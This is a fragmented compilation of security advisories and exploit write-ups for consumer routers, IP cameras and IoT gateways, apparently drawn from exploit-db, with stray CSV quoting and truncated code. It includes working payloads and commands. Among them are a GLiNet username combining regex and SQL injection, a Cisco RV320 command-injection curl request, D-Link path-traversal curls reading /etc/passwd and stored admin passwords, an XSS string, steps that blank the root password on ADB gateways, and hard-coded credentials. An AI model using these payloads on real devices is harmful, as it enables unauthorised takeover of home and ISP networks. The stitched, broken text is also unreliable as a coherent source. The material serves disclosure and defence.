while i >= 0:
if i == len(r) - 1:
x = r[i]
tmp = ((x & 7) << 5) & 0xff
if i == 0:
assert tmp is not None
x = r[0]
x = (x >> 3) & 0xff
x = (x + tmp) & 0xff
r[0] = x
else:
c1 = r[i-1]
c2 = r[i]
c1 = c1 & 0x7
c2 = (c2 >> 3) & 0xff
c1 = (c1 << 5) & 0xff
c2 = (c2 + c1) & 0xff
r[i] = c2
i = i - 1
r = """".join([chr(x) for x in r])
s = """"
assert (len(r) % 2) == 0
for i in range(len(r)/2):
s += r[i+(len(r)/2)] + r[i]
return s
</cut>
The above procedure returns the deobfuscated ASCII version of the
configuration file. This file includes, among other things, also the web
password for the ""admin"" user.
As a side note, it is worth considering that, after exploiting this issue,
authenticated attackers can also leverage the undocumented /docmd.htm web page
to execute arbitrary commands on the affected devices.
[REMEDIATION]
This issue has been addressed by D-Link in the following firmware releases:
* DCS-930L V1.06B5 (August 15, 2012)
* DCS-932L V1.04B5 (August 15, 2012)
These updates are available through mydlink.com and have also been implemented
on DCS-942L and higher camera products.
[DISCLOSURE TIME-LINE]
* 20/06/2012 - Initial vendor contact.
* 11/07/2012 - The author provided D-Link with the details of the
vulnerability.
* 12/07/2012 - D-Link confirmed the issue is a new security vulnerability.

This module exploits a vulnerability found in TRENDnet SecurView Internet
Camera's ActiveX control.  By supplying a long string of data as the sFilter
argument of the OpenFileDlg() function, it is possible to trigger a buffer
overflow condition due to WideCharToMultiByte (which converts unicode back to)
overwriting the stack more than it should, which results arbitrary code execution
under the context of the user.

Background:
The mentioned product, when browsing the device web interface,
asks to install an ActiveX control to stream video content.
It has the following settings:
File version: 1, 1, 52, 18
Product name: UltraMJCam device ActiveX Control
Binary path: C:\WINDOWS\Downloaded Program Files\UltraMJCamX.ocx
ProgID: UltraMJCam.UltraMJCam.1
CLSID: {707ABFC2-1D27-4a10-A6E4-6BE6BDF9FB11}
Implements IObjectSafety: yes
Safe for Scripting (IObjectSafety): True
Safe for Initialization (IObjectSafety): True
Vulnerability:
This ActiveX control exposed the vulnerable
OpenFileDlg() method, see typelib:
function OpenFileDlg(
By invoking this method with an overlong argument is possible
to overflow a buffer. This is because of an insecure

GLiNet: Router Authentication Bypass

4. Timeline
1. Overview
CVE-2023-46453 is a remote authentication bypass vulnerability in the web
interface of GLiNet routers running firmware versions 4.x and up. The
vulnerability allows an attacker to bypass authentication and gain access
to the router's web interface.
2. Detailed Description
The vulnerability is caused by a lack of proper authentication checks in
/usr/sbin/gl-ngx-session file. The file is responsible for authenticating
users to the web interface. The authentication is in different stages.
Stage 1:
During the first stage the user send a request to the challenge rcp
endpoint. The endpoint returns a random nonce value used later in the
authentication process.
Stage 2:
During the second stage the user sends a request to the login rcp endpoint
with the username and the encrypted password. The encrypted password is
calculated by the following formula:
md5(username + crypt(password) + nonce)
The crypt function is the standard unix crypt function.
The vulnerability lies in the fact that the username is not sanitized
properly before being passed to the login_test function in the lua script.
local function login_test(username, hash)
if not username or username == """" then return false end
for l in io.lines(""/etc/shadow"") do
local pw = l:match('^' .. username .. ':([^:]+)')
if pw then
for nonce in pairs(nonces) do
if utils.md5(table.concat({username, pw, nonce}, "":"")) ==
hash then
nonces[nonce] = nil
nonce_cnt = nonce_cnt - 1
return true
end
end
return false
end
end
return false
end
This script check the username against the /etc/shadow file. If the username
is found in the file the script will extract the password hash and compare
it to the hash sent by the user. If the hashes match the user is
authenticated.
The issue is that the username is not sanitized properly before being
concatenated with the regex. This allows an attacker to inject a regex into
the username field and modify the final behavior of the regex.
for instance, the following username will match the userid of the root user:
root:[^:]+:[^:]+ will become root:[^:]+:[^:]+:([^:]+)
This will match the ""root:"" string and then any character until the next "":""
character. This will cause the script skip the password and return the
user id instead.
Since the user id of the root user is always 0, the script will always
return:
md5(""root:[^:]+:[^:]+"" + ""0"" + nonce)
Since this value is always the same, the attacker can simply send the known
hash value to the login rcp endpoint and gain access to the web interface.
Anyway this approach won't work as expected since later in the code inside
the
this check appear:
local aclgroup = db.get_acl_by_username(username)
local sid = utils.generate_id(32)
sessions[sid] = {
username = username,
aclgroup = aclgroup,
timeout = time_now() + session_timeout
The username which is now our custom regex will be passed to the
get_acl_by_username
function. This function will check the username against a database and
return the aclgroup associated with the username.
If the username is not found in the database the function will return nil,
thus causing attack to fail.
By checking the code we can see that the get_acl_by_username function is
actually appending our raw string to a query and then executing it.
This means that we can inject a sql query into the username field and
make it return a valid aclgroup.
M.get_acl_by_username = function(username)
if username == ""root"" then return ""root"" end
local db = sqlite3.open(DB)
local sql = string.format(""SELECT acl FROM account WHERE username =
'%s'"", username)
local aclgroup = """"
for a in db:rows(sql) do
aclgroup = a[1]
end
db:close()
return aclgroup
end
Using this payload we were able to craft a username which is both a valid
regex and a valid sql query:
roo[^'union selecT char(114,111,111,116)--]:[^:]+:[^:]+
this will make the sql query become:
SELECT acl FROM account WHERE username = 'roo[^'union selecT
char(114,111,111,116)--]:[^:]+:[^:]+'
which will return the aclgroup of the root user (root).

# change this to serve on a different port","Summary
The Ruijie Reyee Cloud Web Controller allows the user to use a diagnostic tool which includes a ping check to ensure connection to the intended network, but the ip address input form is not validated properly and allows the user to perform OS command injection.
In other side, Ruijie Reyee Cloud based Device will make polling request to Ruijie Reyee CWMP server to ask if there's any command from web controller need to be executed. After analyze the network capture that come from the device, the connection for pooling request to Ruijie Reyee CWMP server is unencrypted HTTP request.
Because of unencrypted HTTP request that come from Ruijie Reyee Cloud based Device, attacker could make fake server using Man-in-The-Middle (MiTM) attack and send arbitrary commands to execute on the cloud based device that make CWMP request to fake server.
Once the attacker have gained access, they can execute arbitrary commands on the system or application, potentially compromising sensitive data, installing malware, or taking control of the system.

# USR IOT 4G LTE Industrial Cellular VPN Router 1.0.36 Remote Root Backdoor
# Vendor: Jinan USR IOT Technology Limited
# Product web page: https://www.pusr.com | https://www.usriot.com
# Affected version: 1.0.36 (USR-G800V2, USR-G806, USR-G807, USR-G808)
#                   1.2.7 (USR-LG220-L)
# Summary: USR-G806 is a industrial 4G wireless LTE router which provides
# a solution for users to connect own device to 4G network via WiFi interface
# or Ethernet interface. USR-G806 adopts high performance embedded CPU which
# can support 580MHz working frequency and can be widely used in Smart Grid,
# Smart Home, public bus and Vending machine for data transmission at high
# speed. USR-G806 supports various functions such as APN card, VPN, WIFIDOG,
# flow control and has many advantages including high reliability, simple
# operation, reasonable price. USR-G806 supports WAN interface, LAN interface,
# WLAN interface, 4G interface. USR-G806 provides various networking mode
# to help user establish own network.
# Desc: The USR IOT industrial router is vulnerable to hard-coded credentials
# within its Linux distribution image. These sets of credentials are never
# exposed to the end-user and cannot be changed through any normal operation
# of the device. The 'usr' account with password 'www.usr.cn' has the highest
# privileges on the device. The password is also the default WLAN password.

ExpressVPN Router's Login Panel runs on Nginx webserver, the version v1 of the router's firmware hosts web login panel on vulnerable web server
ExpressVPN Summary: A publicly known bug in the Nginx server used by the ExpressVPN Router version 1.x firmware was reported. ExpressVPN no longer ships or supports that version and all users are encouraged to upgrade to the latest version of the ExpressVPN Router firmware available on our site, which is not vulnerable to this bug. Additionally, we highly discourage our users from exposing their router control panel to the Internet, as this class of bug would only be exploitable with access to the control panel, which is usually restricted to the local network. For help or support upgrading your router please visit: https://www.expressvpn.com/support/
ExpressVPN Router version 1 is vulnerable to integer overflow vulnerability in Nginx range filter module resulting into leak of potentially sensitive information triggered by specially crafted request.

CVE: CVE-2018-8062
Disclosure timeline:
08/03/2018: Vulnerability was discovered
10/03/2018: Reported to Mitre (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8062)
11/03/2018: Mitre answered, CVE number reserved
11/03/2018: Reported to Comtrend as part of responsible disclosure, they never answered
16/10/2020: Two years later, reported again to Comtrend and public disclosure (https://twitter.com/OscarAkaElvis/status/1317004119509471233)
18/10/2020: Exploit creation
19/10/2020: Exploit sent to exploit-db
Exploitation explanation:
To exploit this vulnerability, once logged into the router, a WAN service must be created
Click on ""Advanced Setup"", ""WAN Service"". ""Add button"", ""Next""
Then insert the payload into the ""Enter Service Description"" field. This was used for the PoC <script>alert('xss');</script>
Then click on ""Next"" four times to go on through the steps and finally click on ""Apply/Save""
The result of the XSS will be displayed and triggered on the WAN services page
This exploit automatize the entire process bypassing CSRF protection and allowing to set a custom XSS payload
Happy hacking :)

# Exploit Author: Hritik Vijay (@MrHritik)
# Vendor Homepage: https://zte.com.cn
# Reported: 2019-06-14
# Version: F6x2W V6.0.10P2T2
# Version: F6x2W V6.0.10P2T5
# Tested on: F602W
# CVE: CVE-2020-6862
#!/bin/bash","Background
Captcha is used to make sure the form is being filled by a real person
than an automated script. This is a very popular safety measure and
bypassing it could lead to potential compromise.
Introduction
While logging in to the affected device you are presented with a
username, password and captcha field. Submitting the form results in an
HTTP request being sent out to /checkValidateCode.gch to validate the
captcha, if valid it goes on to really submit the login request. This
can be easily bypassed as this is a client side verification. One can
always ignore the response and proceed to forcefully submit the form via
Javascript (via calling the subpageSubmit() method).
A typical login request looks like this:
POST / HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.1/
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Connection: close
Cookie: _TESTCOOKIESUPPORT=1
Upgrade-Insecure-Requests: 1
frashnum=&action=login&Frm_Logintoken=2&Username=admin&Password=admin&Validatecode=literally_anything
Though, firing the same request twice fails with a text on the top
saying ""Error"". This pretty much defeats our purpose. It turns out that
on every login attempt, the parameter Frm_Logintoken gets incremented by
one and is required to match the server side value. This can pretty
easily be achieved by some pattern matching. Thus allowing any script
to bypass the captcha and log in.
Threat
A captcha bypass can really help in bruteforcing the credentials but
luckily the router limits the login trials to 3 attempts. In real
world though, things are a bit different.
The affected ZTE router comes with a default password. Given that the
devices on a same ISP network can access each other, it would be a
matter of time before someone writes a script to log in to every router
in the network and take control of it.

# Date: 2019-10-30
# Exploit Author: Jacob Baines
# Vendor Homepage: https://mikrotik.com/
# Software Link: https://mikrotik.com/download
# Version: 6.45.6 Stable (and below) or 6.44.5 Long-term (and below)
# Tested on: Various x86 and MIPSBE RouterOS installs
# CVE : CVE-2019-3978
# Writeup: https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21
# Disclosure: https://www.tenable.com/security/research/tra-2019-46
# Unauthenticated DNS request via Winbox
# RouterOS before 6.45.7 (stable) and 6.44.6 (Long-term) allowed an unauthenticated remote user trigger DNS requests
# to a user specified DNS server via port 8291 (winbox). The DNS response then gets cached by RouterOS, setting up
# a perfect situation for unauthenticated DNS cache poisoning. This is assigned CVE-2019-3978.
# This PoC takes a target ip/port (router) and a DNS server (e.g. 8.8.8.8).
# The PoC will always send a DNS request for example.com. In the following write up,
# I detail how to use this to poison the routers cache:
# https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21
# Note that the writup focuses on router's configured *without* the DNS server enabled.
# Obviously this attack is significantly more powerful when downstream clients use the router as a DNS server.
## What are the build dependencies?
# This requires:
# * Boost 1.66 or higher
# * cmake
## How do I build this jawn?
# Just normal cmake. Try this:
# ```sh
# mkdir build
# cd build
# cmake ..
# make
# ```
# Resolve dependencies as needed.
## Usage Example
# ```sh
# albinolobster@ubuntu:~/routeros/poc/winbox_dns_request/build$ ./winbox_dns_request -i 192.168.1.50 -p 8291 -s 8.8.8.8

'Description'    => %q{
A vulnerability in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall,
Cisco RV130W Wireless-N Multifunction VPN Router, and Cisco RV215W Wireless-N VPN Router
could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.
The vulnerability is due to improper validation of user-supplied data in the web-based management interface.
An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.
A successful exploit could allow the attacker to execute arbitrary code on the underlying operating
system of the affected device as a high-privilege user.
RV110W Wireless-N VPN Firewall versions prior to 1.2.2.1 are affected.
RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.
RV215W Wireless-N VPN Router versions prior to 1.3.1.1 are affected.
Note: successful exploitation may not result in a session, and as such,
on_new_session will never repair the HTTP server, leading to a denial-of-service condition.

A vulnerability in the web-based management interface of the Cisco RV130W Wireless-N Multifunction VPN Router
could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.
The vulnerability is due to improper validation of user-supplied data in the web-based management interface.
An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.
A successful exploit could allow the attacker to execute arbitrary code on the underlying operating
system of the affected device as a high-privilege user.
RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.
Note: successful exploitation may not result in a session, and as such,
on_new_session will never repair the HTTP server, leading to a denial-of-service condition.

2019-01-25,WebApps,Hardware,RedTeam Pentesting,Cisco RV320 Dual Gigabit WAN VPN Router 1.4.2.15,Command Injection,"https://www.redteam-pentesting.de/
https://www.redteam-pentesting.de/jobs/","RedTeam Pentesting discovered a command injection vulnerability in the
web-based certificate generator feature of the Cisco RV320 router.
Details
Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
Affected Versions: 1.4.2.15 and later
Fixed Versions: since 1.4.2.20
Vulnerability Type: Remote Code Execution
Security Risk: medium
Vendor URL: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2018-004
Advisory Status: published
CVE: CVE-2019-1652
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1652
Introduction
""Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network.""
(from the Cisco RV320 product page [1])
More Details
The router's web interface enables users to generate new X.509
certificates directly on the device. A user may enter typical
configuration parameters required for the certificate, such as
organisation, the common name and so on. In order to generate the
certificate, the device uses the command-line program openssl [2]. The
device's firmware uses the following format string to assemble the
openssl command:
openssl req -new  -nodes  -subj '/C=%s/ST=%s/L=%s/O=%s/OU=%s/CN=%s/emailAddress=%s' -keyout %s%s.key -sha256 -out %s%s.csr -days %s -newkey rsa:%s  > /dev/null 2>&1
Although the web interface filters certain special characters via
JavaScript, there is actually no input filtering, escaping or encoding
happening on the server. This allows attackers to inject arbitrary
commands.
Proof of Concept
Even though all components of the subject seem to be vulnerable to
command injection, the following example uses the common name to trigger
a ping command:
a'$(ping -c 4 192.168.1.2)'b
The following HTTP POST request invokes the certificate generator
function and triggers the command injection. It requires a valid session
cookie for the device's web interface.
curl -s -b ""$COOKIE"" \
--data ""page=self_generator.htm&totalRules=1&OpenVPNRules=30""\
""&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A""\
""&organization=A&organization_unit=A&email=ab%40example.com""\
""&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&""\
""SelectSubject_s=1"" \
--data-urlencode ""common_name=a'\$(ping -c 4 192.168.1.2)'b"" \
""http://192.168.1.1/certificate_handle2.htm?type=4""
Afterwards, the incoming ICMP echo requests can be observed on the
attacker's system at 192.168.1.2.
Workaround
Prevent untrusted users from using the router's web interface.
Fix
Install firmware version 1.4.2.20 (or later) on the router.
Security Risk
The vulnerability allows attackers with administrative access to the
router's web interface to execute arbitrary operating system commands on
the device. Because attackers require valid credentials to the web
interface, this vulnerability is only rated as a medium risk.

allows remote attackers to read arbitrary files via a /.. or // after “GET /uir” in an HTTP request.
NOTE: this vulnerability exists because of an incorrect fix for CVE-2017-6190.
PoC:
`$ curl http://routerip/uir//etc/passwd`
The vulnerability can be used retrieve administrative password using the other disclosed vulnerability - CVE-2018-10824.
This vulnerability was reported previously by Patryk Bogdan in CVE-2017-6190 but he reported it is fixed in certain release but unfortunately it is still present in even newer releases. The vulnerability is also present in other D-Link routers and can be exploited not only (as the original author stated) by double dot but also absolutely using double slash."

Description:","CVE: CVE-2018-10824
An issue was discovered on D-Link routers:
DWR-116 through 1.06,
DIR-140L through 1.02,
DIR-640L through 1.02,
DWR-512 through 2.02,
DWR-712 through 2.02,
DWR-912 through 2.02,
DWR-921 through 2.02,
DWR-111 through 1.01,
and probably others with the same type of firmware.
NOTE: I have changed the filename in description to XXX because the vendor leaves some EOL routers unpatched and the attack is too simple
The administrative password is stored in plaintext in the /tmp/XXX/0 file. An attacker having a directory traversal (or LFI) can easily get full router access.
PoC using the directory traversal vulnerability disclosed above - CVE-2018-10822
`$ curl http://routerip/uir//tmp/XXX/0`
This command returns a binary config file which contains admin username and password as well as many other router configuration settings. By using the directory traversal vulnerability it is possible to read the file without authentication."

Longterm: 6.30.1 - 6.40.7
Stable: 6.29 - 6.42
Beta: 6.29rc1 - 6.43rc3
The exploit can be found here: https://github.com/tenable/routeros/tree/master/poc/bytheway
The exploit leverages the path traversal vulnerability CVE-2018-14847 to extract the admin password and create an ""option"" package to enable the developer backdoor. Post exploitation the attacker can connect to Telnet or SSH using the root user ""devel"" with the admin's password.
Mikrotik patched CVE-2018-14847 back in April. However, until this PoC was written, I don't believe its been publicly disclosed that the attack can be levegered to write files. You can find Mikrotik's advisory here:
Note that, while this exploit is written for Winbox, it could be ported to HTTP as long as you had prior knowledge of the admin credentials.

Business recommendation:
By exploiting the group manipulation vulnerability on affected and unpatched
devices an attacker is able to gain access to the command line interface (CLI)
if previously disabled by the ISP.
Depending on the feature-set of the CLI (ISP dependent) it is then possible to
gain access to the whole configuration and manipulate settings in the web GUI
and escalate privileges to highest access rights.
It is highly recommended by SEC Consult to perform a thorough security review
by security professionals for this platform. It is assumed that further critical
vulnerabilities exist within the firmware of this device.
Vulnerability overview/description:
1) Privilege escalation via linux group manipulation (CVE-2018-13110)
An attacker with standard / low access rights within the web GUI is able to
gain access to the CLI (if it has been previously disabled by the configuration)
and escalate his privileges.
Depending on the CLI features it is possible to extract the whole configuration
and manipulate settings or gain access to debug features of the device, e.g.
via ""debug"", ""upgrade"", ""upload"" etc. commands in the CLI.
Attackers can gain access to sensitive configuration data such as VoIP
credentials or other information and manipulate any settings of the device.
Proof of concept:
1) Privilege escalation via linux group manipulation (CVE-2018-13110)
It is possible to manipulate the group name setting of ""Storage users"" and
overwrite the local linux groups called ""remoteaccess"" or ""localaccess"" in
(in /etc/group) which define access to Telnet or SSH on the ADB devices.
It may be possible to overwrite the ""root"" group as well but it may brick the
device and the default user is already within the ""root"" group. Hence this
attack has not been further tested.
The following steps describe the attack:
a) Add a new group called ""localaccess"" via the web GUI here:
This will generate the following new group in /etc/group. The original
""localaccess"" group will overwritten.
localaccess:Storage Group:5001:
b) Then delete this group via the web GUI again, the entry will be removed
from /etc/group completely.
c) Afterwards, create the following new group name entry via the web GUI and
add your user account (e.g. admin) which should have access to Telnet/SSH
now:
localaccess:x:20:root,admin,
d) Now the admin user has been added to the ""localaccess"" group and the ""admin""
account is allowed to login via SSH or Telnet. Excerpt of new /etc/group:
localaccess:x:20:root,admin,:Storage Group:5001:
Further attacks on the CLI interface will not be described in detail within
this advisory. It is possible to add new user accounts with highest access rights
(""newuser"" command) or upload the whole configuration to a remote FTP server
(""upload"" command). The available feature-set of the CLI depends on the firmware
version.
The XML configuration is encrypted, but can be easily decrypted with access to the
firmware. Then it can be manipulated and uploaded to the device again (""upgrade""
command) which allows privilege escalation by changing permissions or roles
within this file.
Vulnerable / tested versions:
The following specific devices & firmware have been tested which were the most
recent versions at the time of discovery:
The firmware versions depend on the ISP / customer of ADB and may vary!
ADB P.RG AV4202N - E_3.3.0, firmware version depending on ISP
ADB DV 2210 - E_5.3.0, firmware version depending on ISP
ADB VV 5522 - E_8.3.0, firmware version depending on ISP
ADB VV 2220 - E_9.0.6, firmware version depending on ISP
etc.
It has been confirmed by ADB that _all_ their ADB modems / gateways / routers
based on the Epicentro platform are affected by this vulnerability in all
firmware versions for all their customers (ISPs) at the time of identification
of the vulnerability _except_ those devices which have a custom UI developed
for the ISP.
Vendor contact timeline:
2016-07-12: Contacting vendor ADB, sending encrypted advisory, asking about
affected devices
2016-07 - 2017-04: Further coordination, waiting for firmware release,
implementation & rollout phases for their customers
2018-07-04: Embargo lifted, public release of security advisory
Solution:
The firmware versions depend on the ISP / customer of ADB and may vary!
Patch version:
ADB P.RG AV4202N >= E_3.3.2, firmware version depending on ISP
ADB DV2210 >= E_5.3.2, firmware version depending on ISP
ADB VV5522 >= E_8.3.2, firmware version depending on ISP
ADB VV2220 >= E_9.3.2, firmware version depending on ISP
etc.
Workaround:
Restrict access to the web interface and only allow trusted users.
Change any default/weak passwords to strong credentials.
Don't allow remote access to the web GUI via Internet.

Business recommendation:
By exploiting the local root vulnerability on affected and unpatched devices
an attacker is able to gain full access to the device with highest privileges.
Attackers are able to modify any settings that might have otherwise been
prohibited by the ISP. It is possible to retrieve all stored user credentials
(such as VoIP) or SSL private keys. Furthermore, attacks on the internal network
side of the ISP are possible by using the device as a jump host, depending on
the internal network security measures.
Network security should not depend on the security of independent devices,
such as modems. An attacker with root access to such a device can enable
attacks on connected networks, such as administrative networks managed by the
ISP or other users.
It is highly recommended by SEC Consult to perform a thorough security review
by security professionals for this platform. It is assumed that further critical
vulnerabilities exist within the firmware of this device.
Vulnerability overview/description:
1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
Most ADB devices offer USB ports in order for customers to use them for
printer or file sharing. In the past, ADB devices have suffered from symlink
attacks e.g. via FTP server functionality which has been fixed in more recent
firmware versions.
The ""Network File Sharing"" feature of current ADB devices via USB uses a samba
daemon which accesses the USB drive with highest access rights and exports the
network shares with root user permissions. The default and hardcoded setting
for the samba daemon within the smb.conf on the device has set ""wide links =
no"" which normally disallows gaining access to the root file system of the
device using symlink attacks via a USB drive.
But an attacker is able to exploit both a web GUI input validation and samba
configuration file parsing problem which makes it possible to access the root
file system of the device with root access rights via a manipulated USB drive.
The attacker can then edit various system files, e.g. passwd and session
information of the web server in order to escalate web GUI privileges and
start a telnet server and gain full system level shell access as root.
This is a local attack and not possible via remote access vectors as an
attacker needs to insert a specially crafted USB drive into the device!
Usually not even the ISPs themselves have direct root access on ADB devices
hence this attack is quite problematic for further internal attacks.
It is possible to change network routes and attack networks and systems within
the internal network of the ISP or add backdoors or sniffers to the device.
Furthermore, attackers are able to gain access to all stored credentials,
such as PPP, wireless, CPE management or VoIP passwords.
Proof of concept:
1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
The samba configuration file (smb.conf) of the ADB devices has set the
following default settings. All file system operations will be performed
by the root user as set in the ""force user"" / ""force group"" setting of the
exported share:
[global]
netbios name = HOSTNAME
workgroup = WORKGROUP
wide links = no
smb ports = 445 139
security = share
guest account = root
announce version = 5.0
socket options = TCP_NODELAY SO_RCVBUF=65536 SO_SNDBUF=65536
null passwords = yes
name resolve order = hosts wins bcast
wins support = yes
syslog only = yes
read only = no
hosts allow = 192.168.1.1/255.255.255.0
[share]
path = /mnt/sdb1/.
read only = false
force user = root
force group = root
guest ok = yes
An attacker can edit various values such as ""netbios name"" and ""workgroup"" via
the web GUI. The web GUI does some basic filtering and newlines are
unfortunately not allowed (the samba config file is line-based) hence a
special bypass has been crafted in order to change the default setting ""wide
links = no"" to ""wide links = yes"". This enables symlinks to the root file
system.
By using the following netbios name and workgroup, samba can be tricked into
allowing symlinks to the root file system of the device:
netbios domain / workgroup = =wide links = yes \ netbios name = wide links = yes
Relevant HTTP POST parameters:
&domainName==wide links = yes \ \ &hostName=wide+links+%3D+yes+%5C
According to the manpage of smb.conf, any line ending in a \ is continued by the
samba parser on the next line. Furthermore, it states that ""Only the first
equals sign in a parameter is significant."" - which it seems can be bypassed
by adding a backslash \. The parser now thinks that the ""wide links = yes"" has
been set and omits the hardcoded ""wide links = no"" which comes further down
below in the smb.conf file.
In order to add those special values within the web GUI a proxy server such as
burp proxy is needed because of basic input validation on the client side (not
server side).
The USB drive needs to be formatted to ext2 or ext3 which is supported by
the ADB device. Then create a symlink to the root file system via the
following command on the attacker's computer:
ln -s / /path/to/usbdevice/rootfs
After those settings have been changed and the USB drive has been set up,
the USB drive can be inserted into the ADB device. The USB volume needs to be
exported (with read/write permissions) as a share via the web GUI. Afterwards
it can be accessed over the network and the ""rootfs"" folder example from above
will give an attacker access to the ADB root file system with ""read & write""
access permissions as root.
Most file systems / partitions on the device are mounted read-only per default,
but the most important one ""/tmp"" contains all settings and is mounted writable
for operations.
The defaut user ""admin"" usually has little access rights during normal
operations which can be changed by manipulating the session file of the web
server within /tmp/ui_session_XXX where XXX is the session id of the currently
logged on user, e.g. change:
from: access.dboard/settings/management/telnetserver =|> 2001
to: access.dboard/settings/management/telnetserver =|> 2220
etc. (or change all entries for maximum access level)
This way, an attacker can give himself all/highest access permissions within
the GUI and change all the settings of the device! Hence the telnet or SSH
server can be started even though they might have been disabled by the ISP.
Furthermore, the /tmp/passwd file has to be changed in order to allow root
access via shell/telnet:
change: root:*:0:0:root:/root:/bin/ash
to: root::0:0:root:/root:/bin/ash
Now telnet into the device with root and no password.

Vendor description:
""ADB creates and delivers the right solutions that enable our customers to
reduce integration and service delivery challenges to increase ARPU and reduce
churn. We combine ADB know-how and products with those from a number of third
party industry leaders to deliver complete solutions that benefit from
collaborative thinking and best in class technologies.""
""Founded in 1995, ADB initially focused on developing and marketing software
for digital TV processors and expanded its business to the design and
manufacture of digital TV equipment in 1997. The company sold its first set-top
box in 1997 and since then has been delivering a number of set-top boxes, and
Gateway devices, together with advanced software platforms. ADB has sold over
60 million devices worldwide to cable, satellite, IPTV and broadband operators.
ADB employs over 500 people, of which 70% are in engineering functions.""
Business recommendation:
By exploiting the authorization bypass vulnerability on affected and unpatched
devices an attacker is able to gain access to settings that are otherwise
forbidden for the user, e.g. through strict settings set by the ISP. It is also
possible to manipulate settings to e.g. enable the telnet server for remote
access if it had been previously disabled by the ISP. The attacker needs some
user account, regardless of the permissions, for login, e.g. the default one
provided by the ISP or printed on the device can be used.
It is highly recommended by SEC Consult to perform a thorough security review
by security professionals for this platform. It is assumed that further critical
vulnerabilities exist within the firmware of this device.
Vulnerability overview/description:
1) Authorization bypass vulnerability (CVE-2018-13109)
Depending on the firmware version/feature-set of the ISP deploying the ADB
device, a standard user account may not have all settings enabled within
the web GUI.
An authenticated attacker is able to bypass those restrictions by adding a
second slash in front of the forbidden entry of the path in the URL.
It is possible to access forbidden entries within the first layer of the web
GUI, any further subsequent layers/paths (sub menus) were not possible to access
during testing but further exploitation can't be ruled out entirely.
Proof of concept:
1) Authorization bypass vulnerability (CVE-2018-13109)
Assume the following URL is blocked/forbidden within the web GUI settings:
Adding a second slash in front of the blocked entry ""telnetserver"" will enable
full access including write permissions to change settings:
This works for many other settings within the web GUI!
In our tests it was not possible to access subsequent layers, e.g.:
Assume that both the proxy menu and submenu ""rtsp"" settings are blocked,
a second slash will _not_ enable access to the RTSP settings:
Nevertheless, it can't be ruled out that sub menus can be accessed too when
further deeper tests are being performed.
Vulnerable / tested versions:
The following devices & firmware have been tested which were the most recent
versions at the time of discovery:
The firmware versions depend on the ISP / customer of ADB and may vary!
ADB P.RG AV4202N - E_3.3.0, latest firmware version, depending on ISP

ADB VV 5522 - E_8.3.0, latest firmware version, depending on ISP
ADB VV 2220 - E_9.0.6, latest firmware version, depending on ISP
etc.
It has been confirmed by ADB that _all_ their ADB modems / gateways / routers
based on the Epicentro platform are affected by this vulnerability in all
firmware versions for all their customers (ISPs) at the time of identification
of the vulnerability _except_ those devices which have a custom UI developed
for the ISP.

2016-07-01: Contacting vendor ADB, sending encrypted advisory, asking about
affected devices
2016-07-08: Receiving information about affected devices

To demonstrate the exploitation, we will use:
- OS GNU/Linux;
- Bluetooth dongle adapter;
- BlueZ utility (for testing Bluetooth connection).
In order to use the script, we will need to set all dependencies in a advance:
```shell
$ pip install -r ./requirements.txt
With the help of `BlueZ` utilities, we should ensure Bluetooth is enabled and
functions properly.
1. Restart the router to provide access to the engineering page.
2. Start the PoC on behalf of the root user (required for operating with
Bluetooth) with the command on executing as an argument:
```shell
$ ./ble_norton_core.py ""/etc/init.d/dropbear start""
After the script is successfully executed, we get access to the device via
the SSH connection. We put `root` as a user and `admin` as password:

Dasan Networks GPON ONT WiFi Router “is indoor type ONT dedicated for FTTH (Fibre to the Home) or FTTP (Fiber to the Premises) deployments. That can work as simple Bridge or behave as Router/NAT. It’s cost-effective CPE that meets carrier-class requirement for Telcom industry and guarantee reliable service proven in the field.”
An independent security researcher, TigerPuma (at) Fosec.vn, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
We tried to contact Dasan since October 8 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for this vulnerability.
All cgi in Dasan web service are symbolic link of cgipage.cgi, and when client request, lighttpd will invoke the corresponding path.
The buffer overflow vulnerability found in function login_action which handler login request.
The function uses strcpy without check length of input from client request.
If we will look at the stack, we can see that we can trigger the buffer overflow and in the end to control the pc.

## Proof of Concept","The following advisory describes a Unauthenticated Path Traversal vulnerability found in Geneko GWR routers series.
Geneko GWG is compact and cost effective communications solution that provides cellular capabilities for fixed and mobile applications such as data acquisition, smart metering, remote monitoring and management. GWG supports a variety of radio bands options on 2G, 3G and 4G cellular technologies.
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
We have informed Geneko of the vulnerability on the 28th of May 2017, the last email we received from them was on the 7th of June 2017. We have no further updates from Geneko regarding the availability of a patch or a workaround for the vulnerability.
CVE: CVE-2017-11456
User controlled input is not sufficiently sanitized, and then passed to a function responsible for accessing the filesystem. Successful exploitation of this vulnerability enables a remote unauthenticated user to read the content of any file existing on the host, this includes files located outside of the web root folder.
